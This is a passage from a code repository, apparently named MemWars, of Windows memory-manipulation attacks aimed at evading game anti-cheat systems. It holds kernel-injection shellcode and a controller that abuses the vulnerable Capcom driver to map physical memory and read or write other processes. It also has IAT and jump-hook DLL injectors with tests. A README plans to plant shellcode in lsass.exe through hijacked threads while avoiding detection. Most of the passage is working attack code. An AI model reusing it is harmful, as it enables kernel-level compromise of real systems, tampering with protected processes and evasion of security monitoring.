		0x0F, 0x0D, 0x08,                                             // prefetchw [rax]
		0x81, 0x38, 0xDD, 0xCC, 0xBB, 0xAA,                           // cmp dword ptr[rax], 0xAABBCCDD
		0xF3, 0x90,                                                   // pause
		0x75, 0xF3,                                                   // jne data_sync_lock

		0xF0, 0xFE, 0x0D, 0xCF, 0xFF, 0xFF, 0xFF,                     // lock dec byte ptr [rip-n]
		0x75, 0x41,                                                   // jnz continue_exec                         
		0x53,                                                         // push registers
		0x51, 
		0x52, 
		0x56, 
		0x57, 
		0x55, 
		0x41, 0x50, 
		0x41, 0x51, 
		0x41, 0x52, 
		0x41, 0x53, 
		0x41, 0x54, 
		0x41, 0x55, 
		0x41, 0x56, 
		0x41, 0x57, 
		0x9C, 
		0x48, 0x89, 0xE5,                                             // mov rbp, rsp
		0x48, 0x83, 0xEC, 0x20,                                       // sub rsp, 0x20
		0x48, 0x83, 0xE4, 0xF0,                                       // and rsp, 0xFFFFFFFFFFFFFFF0
		0xE8, 0x26, 0x00, 0x00, 0x00,                                 // call stub
		0x48, 0x89, 0xEC,                                             // mov rsp, rbp
		0x9D,                                                         // pop registers
		0x41, 0x5F, 
		0x41, 0x5E,
		0x41, 0x5D, 
		0x41, 0x5C, 
		0x41, 0x5B, 
		0x41, 0x5A, 
		0x41, 0x59, 
		0x41, 0x58, 
		0x5D, 
		0x5F, 
		0x5E, 
		0x5A, 
		0x59, 
		0x5B, 
		0x48, 0xB8, 0xAA, 0xFF, 0xEE, 0xDD, 0xCC, 0xBB, 0xAA, 0x00,  // mov rax, 0xAABBCCDDEEFFAA
		0xFF, 0xE0                                                   // jmp rax
		                                                             // stub:
	};


	*(PVOID*) &prologue[0x77] = hookOut;
	*(PVOID*) &prologue[0x16] = valCheck;
	*(DWORD*) &prologue[0x23] = *(DWORD*)valCheck;


	vector<BYTE> jmpEntryPont = { 
		0x48, 0xB8, 0xDD, 0xCC, 0xBB, 0xAA, 0x00, 0x00, 0x00, 0x00,   // mov rax, 0xAABBCCDD
		0x48, 0x89, 0xC1,                                             // mov rcx, rax
		0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00,                     // mov rdx, 1
		0x4D, 0x31, 0xC0,                                             // xor r8, r8
		0x48, 0x05, 0xCD, 0xBB, 0xAA, 0x00,                           // add rax, 0xAABBCD
		0xFF, 0xE0                                                    // jmp rax
	};

	uint32_t shellSize = CreateImportShell(file.data(), nullptr, loadLib).size() + jmpEntryPont.size() + prologue.size();
    BYTE* memory = (BYTE*)KernelMemoryAllocator(optionalHeader->SizeOfImage + shellSize + 0xFFF);
	
	
    uint64_t imageMemory = ((uint64_t)memory + shellSize + 0xFFF)&(~0xFFF);

	*(uint64_t*)(&jmpEntryPont[0x02]) = imageMemory;
	*(uint32_t*)(&jmpEntryPont[0x19]) = fileHeader->OptionalHeader.AddressOfEntryPoint;

	auto shell = CreateImportShell(file.data(), PVOID(imageMemory), loadLib);
	PushBytes(shell, jmpEntryPont);
	PushBytes(prologue, shell);
	shell = prologue;
    RelocateImage(file.data(), PBYTE(imageMemory));
	memcpy(memory, shell.data(), shell.size());

	// cout << (PVOID)memory << endl;
	// cout << "relax" << endl;

    return TRUE;
}
```

`AttackServices/HiddenKernelDLLInjectionAttack/MemoryController.h`:

```h
#pragma once
#include <windows.h>
#include <winternl.h>
#include <inttypes.h>
#include <iostream>
#include <functional>  
#include "../CapcomDriverAttack/CapcomWrapper.h"
#include "../CapcomDriverAttack/CapcomLockMemory.h"
#include "../../Core/MemWarsServicesCore.h"

using namespace std;

#define STATUS_SUCCESS 0
#define PFN_TO_PAGE(pfn) (pfn << 12)

#pragma pack(push, 1)
typedef union CR3_ {
	uint64_t value;
	struct {
		uint64_t ignored_1 : 3;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t ignored_2 : 7;
		uint64_t pml4_p : 40;
		uint64_t reserved : 12;
	};
} PTE_CR3;

typedef union VIRT_ADDR_ {
	uint64_t value;
	void *pointer;
	struct {
		uint64_t offset : 12;
		uint64_t pt_index : 9;
		uint64_t pd_index : 9;
		uint64_t pdpt_index : 9;
		uint64_t pml4_index : 9;
		uint64_t reserved : 16;
	};
} VIRT_ADDR;

typedef uint64_t PHYS_ADDR;

typedef union PML4E_ {
	uint64_t value;
	struct {
		uint64_t present : 1;
		uint64_t rw : 1;
		uint64_t user : 1;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t accessed : 1;
		uint64_t ignored_1 : 1;
		uint64_t reserved_1 : 1;
		uint64_t ignored_2 : 4;
		uint64_t pdpt_p : 40;
		uint64_t ignored_3 : 11;
		uint64_t xd : 1;
	};
} PML4E;

typedef union PDPTE_ {
	uint64_t value;
	struct {
		uint64_t present : 1;
		uint64_t rw : 1;
		uint64_t user : 1;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t accessed : 1;
		uint64_t dirty : 1;
		uint64_t page_size : 1;
		uint64_t ignored_2 : 4;
		uint64_t pd_p : 40;
		uint64_t ignored_3 : 11;
		uint64_t xd : 1;
	};
} PDPTE;

typedef union PDE_ {
	uint64_t value;
	struct {
		uint64_t present : 1;
		uint64_t rw : 1;
		uint64_t user : 1;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t accessed : 1;
		uint64_t dirty : 1;
		uint64_t page_size : 1;
		uint64_t ignored_2 : 4;
		uint64_t pt_p : 40;
		uint64_t ignored_3 : 11;
		uint64_t xd : 1;
	};
} PDE;

typedef union PTE_ {
	uint64_t value;
	VIRT_ADDR vaddr;
	struct {
		uint64_t present : 1;
		uint64_t rw : 1;
		uint64_t user : 1;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t accessed : 1;
		uint64_t dirty : 1;
		uint64_t pat : 1;
		uint64_t global : 1;
		uint64_t ignored_1 : 3;
		uint64_t page_frame : 40;
		uint64_t ignored_3 : 11;
		uint64_t xd : 1;
	};
} PTE;
#pragma pack(pop)

typedef LARGE_INTEGER PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;
typedef struct _PHYSICAL_MEMORY_RANGE {
	PHYSICAL_ADDRESS BaseAddress;
	LARGE_INTEGER NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

NON_PAGED_DATA PUCHAR physicalMemoryBegin = NULL;
NON_PAGED_DATA SIZE_T physicalMemorySize;

NON_PAGED_DATA uint64_t currentEProcess;
NON_PAGED_DATA uint64_t currentDirectoryBase;
NON_PAGED_DATA uint64_t targetDirectoryBase;

NON_PAGED_DATA uint64_t uniqueProcessIdOffset;
NON_PAGED_DATA uint64_t activeProcessLinksOffset;
NON_PAGED_DATA uint64_t directoryTableBaseOffset;

struct PageTableInfo {
    PML4E* Pml4e;
    PDPTE* Pdpte;
    PDE* Pde;
    PTE* Pte;
};

/** Windows Kernel Function pointers **/

NON_PAGED_DATA static kernelFuncCall ExAllocatePool;
NON_PAGED_DATA static kernelFuncCall PsGetCurrentProcess;
NON_PAGED_DATA static kernelFuncCall PsGetProcessId;
NON_PAGED_DATA static kernelFuncCall ZwOpenSection;
NON_PAGED_DATA static kernelFuncCall ZwMapViewOfSection;
NON_PAGED_DATA static kernelFuncCall ZwClose;
NON_PAGED_DATA static PPHYSICAL_MEMORY_RANGE(NTAPI* MmGetPhysicalMemoryRanges)(void);

/** Functions executed in kernel mode **/

NON_PAGED_CODE void __stdcall GetPhysicalMemoryData(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
    wchar_t physicalMemoryName[] = L"\\Device\\PhysicalMemory";
	OBJECT_ATTRIBUTES physicalMemoryAttributes;
	UNICODE_STRING physicalMemoryNameUnicode;
    physicalMemoryNameUnicode.Buffer = physicalMemoryName;
	physicalMemoryNameUnicode.Length = sizeof(physicalMemoryName) - 2;
	physicalMemoryNameUnicode.MaximumLength = sizeof(physicalMemoryName);

	physicalMemoryAttributes.Length = sizeof(physicalMemoryAttributes);
	physicalMemoryAttributes.Attributes = OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE;
	physicalMemoryAttributes.ObjectName = &physicalMemoryNameUnicode;
	physicalMemoryAttributes.RootDirectory = 0;
	physicalMemoryAttributes.SecurityDescriptor = 0;
	physicalMemoryAttributes.SecurityQualityOfService = 0;

    PPHYSICAL_MEMORY_RANGE range = MmGetPhysicalMemoryRanges();
    while (range->NumberOfBytes.QuadPart) {
        physicalMemorySize = max(physicalMemorySize, range->BaseAddress.QuadPart + range->NumberOfBytes.QuadPart);
        range++;
    }

    HANDLE physicalMemoryHandle = NULL;
    
    NTSTATUS status = CallWithInterruptsAndSmep(
        ZwOpenSection, 
        &physicalMemoryHandle, 
        uint64_t(SECTION_ALL_ACCESS), 
        &physicalMemoryAttributes
   );

    if (status == STATUS_SUCCESS) {

        status = CallWithInterruptsAndSmep(
            ZwMapViewOfSection,
            physicalMemoryHandle, 
            NtCurrentProcess(), 
            &physicalMemoryBegin, 
            0ull, 
            0ull, 
            0ull, 
            &physicalMemorySize, 
            1ull,
            0, 
            PAGE_READWRITE
       );

        if (status == STATUS_SUCCESS) {
            currentEProcess = PsGetCurrentProcess();
            currentDirectoryBase = __readcr3();
            uint64_t pid = PsGetProcessId(currentEProcess);
            uint32_t pidOffset = *(uint32_t*)((PUCHAR)PsGetProcessId + 3);
            if (pidOffset < 0x400 && *(uint64_t*)(currentEProcess + pidOffset) == pid) {
                uniqueProcessIdOffset = pidOffset;
                activeProcessLinksOffset = uniqueProcessIdOffset + 0x8;
            }

            for (int i = 0; i < 0x400; i += 0x8) {
                uint64_t* ptr = (uint64_t*)(currentEProcess + i);
                if (!uniqueProcessIdOffset && ptr[0] & 0xFFFFFFFF == pid && (ptr[1] > 0xffff800000000000) && (ptr[2] > 0xffff800000000000) && ((ptr[1] & 0xF) == (ptr[2] & 0xF))) {
                    uniqueProcessIdOffset = i;
                    activeProcessLinksOffset = uniqueProcessIdOffset + 0x8;
                } else if (!directoryTableBaseOffset && ptr[0] == __readcr3()) {
                    directoryTableBaseOffset = i;
                }
            }
        }
    }
    ZwClose(physicalMemoryHandle);
}

/** Usermode API functions **/

template<typename T> T& ReadPhysicalUnsafe(uint64_t pa) {
    return *(T*)(physicalMemoryBegin + pa);
}

PageTableInfo QueryPageTableInfo(PVOID va) {
    PageTableInfo pi = { 0,0,0,0 };

    VIRT_ADDR Addr = { (uint64_t) va };
    PTE_CR3 Cr3 = { targetDirectoryBase };

    {
        uint64_t a = PFN_TO_PAGE(Cr3.pml4_p) + sizeof(PML4E) * Addr.pml4_index;
        if (a > physicalMemorySize)
            return pi;
        PML4E& e = ReadPhysicalUnsafe<PML4E>(a);
        if (!e.present)
            return pi;
        pi.Pml4e = &e;
    }
    {
        uint64_t a = PFN_TO_PAGE(pi.Pml4e->pdpt_p) + sizeof(PDPTE) * Addr.pdpt_index;
        if (a > physicalMemorySize)
            return pi;
        PDPTE& e = ReadPhysicalUnsafe<PDPTE>(a);
        if (!e.present)
            return pi;
        pi.Pdpte = &e;
    }
    {
        uint64_t a = PFN_TO_PAGE(pi.Pdpte->pd_p) + sizeof(PDE) * Addr.pd_index;
        if (a > physicalMemorySize)
            return pi;
        PDE& e = ReadPhysicalUnsafe<PDE>(a);
        if (!e.present)
            return pi;
        pi.Pde = &e;
        if (pi.Pde->page_size)
            return pi;
    }
    {
        uint64_t a = PFN_TO_PAGE(pi.Pde->pt_p) + sizeof(PTE) * Addr.pt_index;
        if (a > physicalMemorySize)
            return pi;
        PTE& e = ReadPhysicalUnsafe<PTE>(a);
        if (!e.present)
            return pi;
        pi.Pte = &e;
    }
    return pi;
}

uint64_t VirtToPhys(PVOID va) {
    auto info = QueryPageTableInfo(va);

    if (!info.Pde) {
        return 0;
    }

    uint64_t pa = 0;

    if (info.Pde->page_size) {
        pa = PFN_TO_PAGE(info.Pde->pt_p);
        pa += (uint64_t) va & (0x200000 - 1);
    }
    else {
        if (!info.Pte) {
            return 0;
        }
        pa = PFN_TO_PAGE(info.Pte->page_frame);
        pa += (uint64_t) va & (0x1000 - 1);
    }
    return pa;
}

void IterPhysRegion(PVOID startVa, SIZE_T size, std::function<void(PVOID va, uint64_t, SIZE_T)> Func) {
    PUCHAR it = (PUCHAR)startVa;
    PUCHAR end = it + size;

    while (it < end) {
        SIZE_T size = (PUCHAR) (((uint64_t) it + 0x1000) & (~0xFFF)) - it;

        if ((it + size) > end) {
            size = end - it;
        }

        uint64_t pa = VirtToPhys(it);

        Func(it, pa, size);

        it += size;
    }
}

SIZE_T ReadVirtual(PVOID src, PVOID dst, SIZE_T size) {
    PUCHAR it = (PUCHAR) dst;
    SIZE_T bytesRead = 0;

    IterPhysRegion(src, size, [&](PVOID va, uint64_t pa, SIZE_T sz) {
        if (pa) {
            bytesRead += sz;
            memcpy(it, physicalMemoryBegin + pa, sz);
            it += sz;
        }
    });

    return bytesRead;
}

template<typename T>
T ReadVirtual(PVOID from) {
    char buffer[sizeof(T)];
    ReadVirtual(from, buffer, sizeof(T));
    return *(T*)(buffer);
}

SIZE_T WriteVirtual(PVOID src, PVOID dst, SIZE_T size) {
    PUCHAR it = (PUCHAR)src;
    SIZE_T bytesRead = 0;

    IterPhysRegion(dst, size, [&](PVOID va, uint64_t pa, SIZE_T sz) {
        if (pa) {
            bytesRead += sz;
            memcpy(physicalMemoryBegin + pa, it, sz);
            it += sz;
        }
    });

    return bytesRead;
}

template<typename T>
void WriteVirtual(PVOID to, const T& data) {
    WriteVirtual((PVOID)&data, to, sizeof(T));
}

void SetTargetEProcess(uint64_t eProcess) {
    targetDirectoryBase = ReadVirtual<uint64_t>((PUCHAR)eProcess + directoryTableBaseOffset);
}

void UnsetEProcess() {
    targetDirectoryBase = currentDirectoryBase;
}

uint64_t FindEProcess(uint64_t pid) {
    uint64_t eProcess = currentEProcess;

    do {
        if (ReadVirtual<uint64_t>((PUCHAR) eProcess + uniqueProcessIdOffset) == pid) {
            return eProcess;
        }
        LIST_ENTRY le = ReadVirtual<LIST_ENTRY>((PUCHAR) eProcess + activeProcessLinksOffset);
        eProcess = (uint64_t) le.Flink - activeProcessLinksOffset;
    }
    while (eProcess != currentEProcess);

    return 0;
}

void SetTargetEProcessIfCanRead(uint64_t eProcess, PVOID adr) {
    SetTargetEProcess(eProcess);
    if (!VirtToPhys(adr)) {
        UnsetEProcess();
    }
}

void InitKernelFunctions() {
    ExAllocatePool = GetKernelProcAddress<>("ExAllocatePool");
    PsGetCurrentProcess = GetKernelProcAddress<>("PsGetCurrentProcess");
    PsGetProcessId = GetKernelProcAddress<>("PsGetProcessId");
    ZwOpenSection = GetKernelProcAddress<>("ZwOpenSection");
    ZwMapViewOfSection = GetKernelProcAddress<>("ZwMapViewOfSection");
    ZwClose = GetKernelProcAddress<>("ZwClose");
    MmGetPhysicalMemoryRanges = GetKernelProcAddress<PPHYSICAL_MEMORY_RANGE(*)()>("MmGetPhysicalMemoryRanges");

    // cout << ExAllocatePool << endl;
    // cout << PsGetCurrentProcess << endl;
    // cout << PsGetProcessId << endl;
    // cout << ZwOpenSection << endl;
    // cout << ZwMapViewOfSection << endl;
    // cout << ZwClose << endl;
    // cout << MmGetPhysicalMemoryRanges << endl;
}

BOOL InitMemoryController() {

    InitKernelFunctions();

    // cout << "loading driver..." << endl;
    // system("PAUSE");
    if (!InitDriver()) {
        return FALSE;
    }
    // cout << "getting GetPhysicalMemoryData" << endl;
    // system("PAUSE");
    RunInKernel(GetPhysicalMemoryData, NULL);
    if (!physicalMemoryBegin || !physicalMemorySize || !uniqueProcessIdOffset || !activeProcessLinksOffset) {
        return FALSE;
    }
    // cout << "got GetPhysicalMemoryData" << endl;
    // system("PAUSE");
    targetDirectoryBase = currentDirectoryBase;


    // printf("physicalMemoryBegin: %16llx\n", (uint64_t)physicalMemoryBegin);
    // printf("physicalMemorySize:  %16llx\n", physicalMemorySize);
    // printf("CurrentProcessCr3:   %16llx\n", currentDirectoryBase);
	// printf("CurrentEProcess:     %16llx\n", currentEProcess);

	// printf("DirectoryTableBase  %16llx\n", directoryTableBaseOffset);
	// printf("UniqueProcessId     %16llx\n", uniqueProcessIdOffset);
	// printf("ActiveProcessLinks  %16llx\n", activeProcessLinksOffset);

    return TRUE;
}


```

`AttackServices/HiddenKernelDLLInjectionAttack/README.md`:

```md
# Kernel DLL Injector

This method of attack is still under construction. Here is a rough summary of how it works:

- Load a DLL into kernel memory using a vulnerable kernel driver (in this case the Capcom driver)

- Allow access to the kernel memory from the user mode by manipulating the virtual address-pointers of the kernel memory

- Hook the physical memory of ntdll.dll and the function "TlsGetValue" and check if the target process calls the function

- When the target process calls the function, execute the DLL located in the kernel memory in the target process

- Remove the physical hooks and vulnerable drivers right after they have been used to keep the detection vector small

```

`AttackServices/HiddenKernelDLLInjectionAttack/TestApp.cpp`:

```cpp
#include <windows.h>

using namespace std;

int main() {

    TlsAlloc();

    while (true) {

        TlsGetValue(0);
        Sleep(50);
    }

}
```

`AttackServices/HiddenKernelDLLInjectionAttack/buildCapcomAttackTest.bat`:

```bat
@ECHO OFF
cl.exe /EHsc AttackTest.cpp ../../Core/MemWarsServicesCore.cpp ../../Core/MemWarsCore.c /link user32.lib ntdll.lib Advapi32.lib Shlwapi.lib
```

`AttackServices/IATHookAttack/IATHookDLL.cpp`:

```cpp
#include <windows.h>
#include <iostream>
#include "../../libs/PolyHook/PolyHook.hpp"

using namespace std;

typedef DWORD(__stdcall* tGetCurrentThreadId)();
tGetCurrentThreadId pGetCurrentThreadID;

DWORD __stdcall GetCurrentThreadIDHook() {
    // CreateFileA("IATHookConfirmationFile", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    TCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    lstrcatA(tempPath, "dllInjectionConfirmationFile");
    HANDLE h = CreateFileA(tempPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	CloseHandle(h);
	return pGetCurrentThreadID();
}

DWORD WINAPI InitializeHook(LPVOID lpParam) {
    shared_ptr<PLH::IATHook> IATHook_Ex(new PLH::IATHook);
    IATHook_Ex->SetupHook("kernel32.dll", "GetCurrentThreadId", (BYTE*)&GetCurrentThreadIDHook, "IATHookDLL.dll");
    IATHook_Ex->Hook();
    pGetCurrentThreadID = IATHook_Ex->GetOriginal<tGetCurrentThreadId>();
    GetCurrentThreadId();
    IATHook_Ex->UnHook();
    FreeLibraryAndExitThread((HMODULE)lpParam, 0);
    return 1;
}


BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpvReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, &InitializeHook, hModule, 0, NULL); 
            break;
        }
    return TRUE;
}
```

`AttackServices/IATHookAttack/IATHookTest.cpp`:

```cpp
#include <windows.h>
#include <iostream>
#include <Shlwapi.h>
#include "../../Core/MemWarsCore.h"
#include "../DLLInjectionAttack/Injector.h"

using namespace std;

void IATHookTest() {
    system("start memoryTestApp.exe");
    HANDLE hProcess = NULL;
    while (hProcess == NULL) {
        hProcess = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    
    if (!LoadDll(hProcess, L"InjectedDLL.dll")) {
        cout << "IATHookTest() failed" << endl;
        goto Exit;
    }

    Sleep(100);
    
    if (!PathFileExists("IATHookConfirmationFile")) {
        cout << "IATHookTest() failed" << endl;
        goto Exit;
    } else {
        cout << "IATHookTest() success" << endl;
        system("taskkill /IM memoryTestApp.exe /F >nul");
        DeleteFile("IATHookConfirmationFile");
        return;
    }

    Exit:
    system("taskkill /IM memoryTestApp.exe /F >nul");
}


int main() {
    IATHookTest();
}
```

`AttackServices/IATHookAttack/README.md`:

```md
# Import Address Table Hook



This attack is based on a DLL injection that changes the IAT addresses of the game process.
In this case, the function [GetCurrentThreadId](https://msdn.microsoft.com/de-de/library/windows/desktop/ms683183%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396) is hooked, which first calls our own function before the original function is executed.



The library [PolyHook](https://github.com/stevemk14ebr/PolyHook) is used to change the pointers in the IAT.



```

`AttackServices/IATHookAttack/buildDLL.bat`:

```bat
@ECHO OFF
cl.exe /EHsc /LD IATHookDLL.cpp /link /LTCG /LIBPATH:"C:\Users\marius\git\MemWars\libs\Capstone\msvc\x64\Release" user32.lib
```

`AttackServices/IATHookAttack/buildIATHookTest.bat`:

```bat
@ECHO OFF
cl.exe /EHsc IATHookTest.cpp ../DLLInjectionAttack/Injector.cpp ../../Core/MemWarsCore.c /link user32.lib Advapi32.lib Shlwapi.lib
```

`AttackServices/JmpHookAttack/InjectedDLL.cpp`:

```cpp
#include <windows.h>
#include "InjectedDLL.h"

using namespace std;

PBYTE orgCode;
void* hookFunc;


DWORD FunctionToBeHooked(DWORD id) {
	if (id != 0xBEEF) {
		DeleteFile("jmpHookConfirmationFile");
	}
	return 0;
}

void FunctionCaller() {
	FunctionToBeHooked(0xBEEF);
}

void* GetAddressForCallHook(void* functionStart) {
	DWORD oldProtection = ProtectMemory<BYTE[1000]>(functionStart, PAGE_EXECUTE_READ);
	PBYTE mem = PointMemory<BYTE>(functionStart);

	void* ret = 0;
	for (int i = 0; i < 1000; i++) {
		if (mem[i] == 0xE8) {
			ret = (void*)((uintptr_t)functionStart + i);
			break;
		}
	}
	ProtectMemory<BYTE[1000]>(functionStart, oldProtection);
	return ret;
}

UCHAR* HookWithJump(void* hookAt, void* newFunc) {
	DWORD oldProtection = ProtectMemory<BYTE[12]>(hookAt, PAGE_EXECUTE_READWRITE);
	PBYTE originalCodeBuf = new BYTE[12];
	CopyMemory(originalCodeBuf, hookAt, sizeof(BYTE) * 12);

	BYTE codeCave[] = {
		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,		// mov rax
		0xFF, 0xE0								// jmp rax
	};
	*(DWORD64*)((PUCHAR)codeCave + 2) = (DWORD64)(ULONG_PTR)newFunc;

	CopyMemory(hookAt, codeCave, sizeof(codeCave));
	ProtectMemory<BYTE[12]>(hookAt, oldProtection);
	
	return originalCodeBuf;
}

void UnhookJump(void* hookAt, PBYTE originalCodeBuf) {
	DWORD oldProtection = ProtectMemory<BYTE[12]>(hookAt, PAGE_EXECUTE_READWRITE);
	CopyMemory(hookAt, originalCodeBuf, sizeof(BYTE) * 12);
	ProtectMemory<BYTE[12]>(hookAt, oldProtection);
	delete [] originalCodeBuf;
}

void* HookingFunc() {
	CreateFileA("jmpHookConfirmationFile", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	UnhookJump(hookFunc, orgCode);
	return hookFunc;
}

void* CreateTrampolineFunc() {
	void* trampolineAddr = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	BYTE codeCave[] = {
		0x51,											// push rcx
		0x48, 0x83, 0xEC, 0x8,							// sub rsp, 0x08 (stack alignment for CreateFileA)
		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,				// mov rax, [HookingFunc]
		0xFF, 0xD0,                         			// call rax
		0x48, 0x83, 0xC4, 0x8,							// add rsp, 0x08
		0x59,											// pop rcx
		0xFF, 0xE0										// jmp rax
	};
	*(DWORD64*)((PUCHAR)codeCave + 7) = (DWORD64)(ULONG_PTR)HookingFunc;
	CopyMemory(trampolineAddr, codeCave, sizeof(codeCave));

	return trampolineAddr;
}

DWORD WINAPI StartWork(LPVOID lpParam) {
	hookFunc = GetAddressForCallHook(FunctionCaller);
	void* trampoline = CreateTrampolineFunc();
	orgCode = HookWithJump(hookFunc, trampoline);
	FunctionCaller();
    return 1;
}

BOOL APIENTRY DllMain(HMODULE hinstDLL, DWORD  fdwReason, LPVOID lpReserved) {
	switch (fdwReason) {
		case DLL_PROCESS_ATTACH:
			CreateThread(NULL, 0, &StartWork, NULL, 0, NULL); 
			break;
	}
	return TRUE;
}
```

`AttackServices/JmpHookAttack/InjectedDLL.h`:

```h

using namespace std;

template<typename T>
T* PointMemory(void* address) {
	return ((T*)address);
}

template<typename T>
T ReadMemory(void* address) {
	return *((T*)address);
}

template<typename T>
void WriteMemory(void* address, T value) {
	*((T*)address) = value;
}

template<typename T>
DWORD ProtectMemory(void* address, DWORD prot) {
	DWORD oldProt;
	VirtualProtect(address, sizeof(T), prot, &oldProt);
	return oldProt;
}

void FunctionCaller();
void* GetAddressForCallHook(void* functionStart);
UCHAR* HookWithJump(void* hookAt, void* newFunc);
void UnhookJump(void* hookAt, PBYTE originals);
void* CreateTrampolineFunc();
DWORD FunctionToBeHooked(DWORD id);
void* HookingFunc();
```

`AttackServices/JmpHookAttack/InjectorTest.cpp`:

```cpp
#include <iostream>
#include <Shlwapi.h> // PathFileExists
#include "../../Core/MemWarsCore.h"
#include "../DLLInjectionAttack/Injector.h"

using namespace std;

void JmpHookTest() {
    system("start /B memoryTestApp.exe");
    HANDLE hProcess = NULL;
    while (hProcess == NULL) {
        hProcess = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }

    if (!LoadDll(hProcess, L"InjectedDLL.dll")) {
        cout << "JmpHookTest() failed" << endl;
        goto Exit;
    }

    Sleep(100);

    if (!PathFileExists("jmpHookConfirmationFile")) {
        cout << "JmpHookTest() failed" << endl;
        goto Exit;
    } else {
        cout << "JmpHookTest() success" << endl;
        system("taskkill /IM memoryTestApp.exe /F >nul");
        DeleteFile("jmpHookConfirmationFile");
        return;
    }

    Exit:
    system("taskkill /IM memoryTestApp.exe /F >nul");
}

int main() {
    JmpHookTest();
}
```

`AttackServices/JmpHookAttack/README.md`:

```md
# JMP Hook Attack



This attack is based on a DLL injection.



The DLL has the function "FunctionToBeHooked()", which is executed by "FunctionCaller()".



First the memory of the DLL is read to find the function call of "FunctionToBeHooked()".



A trampoline is then created which first calls the "HookingFunc()" function and then the "FunctionToBeHooked()" function.



Now the function call of "FunctionToBeHooked()" in memory is replaced with the trampoline, so we have executed a JMP hook within our own DLL.
```

`AttackServices/JmpHookAttack/buildDLL.bat`:

```bat
@ECHO OFF
cl.exe /EHsc /LD InjectedDLL.cpp ../../Core/MemWarsServicesCore.cpp /link user32.lib kernel32.lib Advapi32.lib Ntdll.lib
```

`AttackServices/JmpHookAttack/build_InjectorTest.bat`:

```bat
@ECHO OFF
cl.exe /EHsc InjectorTest.cpp ../DLLInjectionAttack/Injector.cpp ../../Core/MemWarsCore.c /link User32.lib Kernel32.lib Advapi32.lib Shlwapi.lib
```

`AttackServices/LsassAttack/README.md`:

```md
# Lsass Attack



This is an advanced attack method that wants to bypass anti-cheat methods.



The attack is divided into two parts (installer and client), which should be executed separately, as the installer manipulates system processes, which are detected by anti-cheat systems. The installer will be executed before the game starts and the client after the game process has started.



The attack method can be summarized as follows:



In the system process lsass.exe shellcode is written, which contains the functions [ReadProcessMemory](https://msdn.microsoft.com/de-de/library/windows/desktop/ms680553%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396) and [WriteProcessMemory](https://msdn.microsoft.com/de-de/library/windows/desktop/ms681674(v=vs.85).aspx). This bypasses the anti-cheat method, which uses ObRegisterCallbacks to prohibit the authorization of HANDLE operations, since lsass.exe cannot get permissions revoked without this leading to system instabilities.



The manipulation of lsass.exe and the communication with the client is as inconspicuous as possible in order not to be detected by anti-cheat methods.




## Installer



- A file mapping is created, which serves as communication interface between lsass.exe and the client

- So that lsass.exe has no HANDLE on a file mapping (this is a detection vector), the file mapping is opened in the shellcode, the address of the file mapping is written to the memory of lsass.exe and the HANDLE is closed again. To ensure that file mapping continues to exist, explorer.exe is captured and a HANDLE for the file mapping is created there permanently. Thus the file mapping remains without the client or lsass.exe needing a HANDLE to it. A pointer to the file mapping is sufficient for communication.

- The installer looks for zeroed executable memory inside lsass.exe where it can write shellcode.
- To execute the shellcode in lsass.exe, an existing unnecessary thread of lsass.exe is captured. The dispensable threads execute the modules "samsrv.dll", "msvcrt.dll" and "crypt32.dll". Creating a new thread on lsass.exe would be another detection vector.
- After the installer is finished, the infiltrated shellcode of lsass.exe is constantly executed by one of the threads.
- The shellcode continuously checks one bit within the file mapping to check if a new command has arrived from the client.

- The file mapping contains a minimal Inter Process Communication protocol with which the client and lsass.exe communicate. The IPC contains, among other things, which process is to be read/written and which memory address is to be read/written.
- To signal to the client that new commands can be received, the bit in the file mapping is reset to 0.
- The results of [ReadProcessMemory](https://msdn.microsoft.com/de-de/library/windows/desktop/ms680553%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396) and [WriteProcessMemory](https://msdn.microsoft.com/de-de/library/windows/desktop/ms681674(v=vs.85).aspx) are written to the file mapping




## Client

- The client connects to the file mapping and uses the IPC protocol to send commands to lsass.exe
```

`AttackServices/LsassAttack/ServicesTest.cpp`:

```cpp
#include <windows.h>
#include <iostream>
#include <process.h>
#include "../../Core/MemWarsCore.h"
#include "../../Core/MemWarsServicesCore.h"
#include "StealthyMemManipulatorInstaller.h"
#include "StealthyMemManipulatorClient.h"

using namespace std;


void SMMInstall_CreateSharedFileMappingTest() {
    StealthyMemInstaller smi;
    vector<wstring> dummy;
    smi.Init(dummy);
    BOOL result = smi.CreateSharedFileMapping();

    if (!result) {
        cout << "SMMInstall_CreateSharedFileMappingTest() failed" << endl;
        return;
    }

    result = UnmapViewOfFile(smi.getPtrLocalSharedMem());
    if (!result) {
        cout << "SMMInstall_CreateSharedFileMappingTest() failed" << endl;
    } else {
        cout << "SMMInstall_CreateSharedFileMappingTest() success" << endl;
    }
}


void SMMInstall_InstanceAlreadyRunningTest() {

    StealthyMemInstaller smi;
    vector<wstring> dummy;
    smi.Init(dummy);
